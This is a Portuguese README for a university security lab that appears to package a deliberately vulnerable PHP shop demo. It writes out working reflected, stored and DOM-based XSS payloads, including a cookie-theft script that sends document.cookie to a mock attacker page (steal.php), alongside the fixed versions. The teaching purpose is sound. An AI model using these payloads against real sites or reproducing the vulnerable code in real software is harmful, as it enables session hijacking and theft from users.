# Artefato Sprint 2 — XSS (Cross-Site Scripting)

**IFB — Segurança em Aplicações 2026/1**
Aplicação de demonstração "LojaExpress" com 3 pontos de XSS e suas correções.

---

## O que tem aqui

```
XSS_Grupo_Sprint2/
├── README.md                  <- este arquivo
├── banco.sql                  <- banco de dados (importar no phpMyAdmin)
├── codigo-vulneravel/         <- aplicação COM as falhas
│   ├── index.php
│   ├── reflected.php          <- Reflected XSS  (obrigatório)
│   ├── comentarios.php        <- Stored XSS     (obrigatório)
│   ├── dom.php                <- DOM-based XSS  (bônus +3)
│   ├── steal.php              <- "servidor do atacante" (roubo de cookie, bônus +3)
│   ├── db.php / topo.php / rodape.php
└── codigo-corrigido/          <- aplicação com as DEFESAS
    ├── index.php
    ├── reflected.php          <- corrigido com htmlspecialchars()
    ├── comentarios.php        <- corrigido com prepared statement + escape
    ├── dom.php + dom.js       <- corrigido com textContent
    └── db.php / topo.php / rodape.php
```

---

## Como rodar (XAMPP — Windows/Linux/Mac)

1. **Instale o XAMPP** e abra o painel. Ligue **Apache** e **MySQL**.
2. **Importe o banco:**
   - Acesse `http://localhost/phpmyadmin`
   - Clique em **Importar** → selecione o arquivo `banco.sql` → **Executar**.
   - Isso cria o banco `app_xss` com as tabelas e dados de exemplo.
3. **Copie as pastas** `codigo-vulneravel` e `codigo-corrigido` para dentro de
   `htdocs` (a pasta do XAMPP). Ex.: `C:\xampp\htdocs\`.
4. **Abra no navegador:**
   - Versão vulnerável: `http://localhost/codigo-vulneravel/index.php`
   - Versão corrigida:  `http://localhost/codigo-corrigido/index.php`

> Se o seu MySQL usar senha, edite a linha de conexão em `db.php` das duas pastas.

---

## Roteiro de demonstração (use no vídeo de 3 a 5 min)

### Ataque 1 — Reflected XSS
- Abra `codigo-vulneravel/reflected.php`
- No campo de busca, cole: `<script>alert('Reflected XSS')</script>`
- ➡️ O alerta dispara → o script refletido da URL foi executado.

### Ataque 2 — Stored XSS (+ roubo de cookie, bônus)
- Abra `codigo-vulneravel/comentarios.php`
- Comentário simples: `<script>alert('Stored XSS')</script>` → recarregue → dispara pra qualquer visitante.
- **Roubo de cookie:** envie o comentário
  `<script>new Image().src='steal.php?c='+document.cookie</script>`
- Recarregue a página. Depois abra o arquivo `codigo-vulneravel/cookies_roubados.txt`
  → o cookie de sessão foi capturado pelo "atacante".

### Ataque 3 — DOM-based XSS (bônus)
- Abra a URL: `codigo-vulneravel/dom.php?user=<img src=x onerror=alert('DOM XSS')>`
- ➡️ O alerta dispara → o `innerHTML` interpretou a tag.

### Demonstração da defesa (verificação da correção)
Repita **os mesmos payloads** na pasta `codigo-corrigido/`:
- Reflected → aparece como texto `<script>...`, não executa (`htmlspecialchars`).
- Stored → o comentário malicioso vira texto; o roubo de cookie falha (cookie `HttpOnly` + `CSP`).
- DOM → a tag aparece como texto (`textContent`).
- Abra o Console (F12): a **CSP** registra o bloqueio de scripts inline.

> 💡 Capture um print de cada payload falhando na versão corrigida — vale ponto
> ("verificação da correção") e é obrigatório mostrar no vídeo.

---

## Técnicas de defesa usadas (uma diferente por ponto)

| Ponto | Vulnerabilidade | Correção |
|-------|-----------------|----------|
| Reflected | entrada refletida sem escape | `htmlspecialchars()` (output encoding) |
| Stored | entrada salva/exibida sem tratamento | prepared statement + `htmlspecialchars()` |
| DOM | `innerHTML` interpreta HTML | `textContent` (texto puro) |
| Camadas extras | cookie legível por JS, scripts livres | cookie `HttpOnly` + `Content-Security-Policy` |
